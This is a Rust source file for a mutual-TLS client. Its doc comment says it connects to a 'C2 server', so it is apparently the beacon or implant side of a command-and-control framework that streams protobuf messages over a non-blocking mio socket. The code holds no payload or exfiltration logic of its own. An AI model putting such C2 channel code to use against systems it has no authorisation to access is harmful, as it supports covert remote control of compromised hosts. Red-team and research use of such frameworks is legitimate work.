use super::Server;
use crate::pb;
use anyhow::Result;
use mio::{net::TcpStream, Interest, Token};
use prost::Message;
use rustls::{ClientConfig, ClientConnection};
use std::io::{Read, Write};
use std::sync::{mpsc, Arc};
use std::time::Duration;

// 0.5 MiB buffer
const BUFFER_SIZE: usize = 524288;
const EVENTS_SIZE: usize = 128;
const CLIENT: Token = Token(0);
const CHANNEL_TIMEOUT: Duration = Duration::from_millis(100);

/// A mutual TLS client to connect to the C2 server
pub struct Client {
    /// mutual TLS connection
    conn: ClientConnection,
    /// A non-blocking TCP socket
    sock: TcpStream,
}

impl Client {
    pub fn new(config: ClientConfig, server: Server) -> Result<Client> {
        // Connect to the server
        Ok(Client {
            conn: ClientConnection::new(Arc::new(config), server.name)?,
            sock: TcpStream::connect(server.addr)?,
        })
    }

    /// Bi-directional streaming on a TLS connection with a server
    pub fn session(&mut self, rx: mpsc::Receiver<pb::Message>, tx: mpsc::Sender<pb::Message>) {
        // Mio boilerplate
        let mut events = mio::Events::with_capacity(EVENTS_SIZE);
        let mut poll = mio::Poll::new().unwrap();
        poll.registry()
            .register(
                &mut self.sock,
                CLIENT,
                Interest::READABLE | Interest::WRITABLE,
            )
            .unwrap();

        // Mio event loop
        loop {
            poll.poll(&mut events, None).unwrap();
            for event in events.iter() {
                if event.token() == CLIENT {
                    // Read data from the server
                    if event.is_readable() {
                        self.conn.read_tls(&mut self.sock).unwrap();
                        let io_state = self.conn.process_new_packets().unwrap();
                        if io_state.plaintext_bytes_to_read() > 0 {
                            let buf = self.read().unwrap();
                            let message = pb::Message::decode(buf.as_slice()).unwrap();
                            tx.send(message).unwrap();
                        }

                        if io_state.peer_has_closed() {
                            return;
                        }
                    }

                    // Write data to the server
                    if event.is_writable() {
                        self.conn.write_tls(&mut self.sock).unwrap();
                        if let Ok(message) = rx.recv_timeout(CHANNEL_TIMEOUT) {
                            self.write(message.encode_to_vec()).unwrap();
                        }
                    }
                }

                poll.registry()
                    .reregister(
                        &mut self.sock,
                        CLIENT,
                        Interest::READABLE | Interest::WRITABLE,
                    )
                    .unwrap();
            }
        }
    }

    // Read data from the connection
    fn read(&mut self) -> Result<Vec<u8>> {
        let mut buf = [0; BUFFER_SIZE];
        let n = self.conn.reader().read(&mut buf)?;
        return Ok(buf[..n].to_vec());
    }

    // Write data to the connection
    fn write(&mut self, buf: Vec<u8>) -> Result<()> {
        self.conn.writer().write(&buf)?;
        Ok(())
    }
}
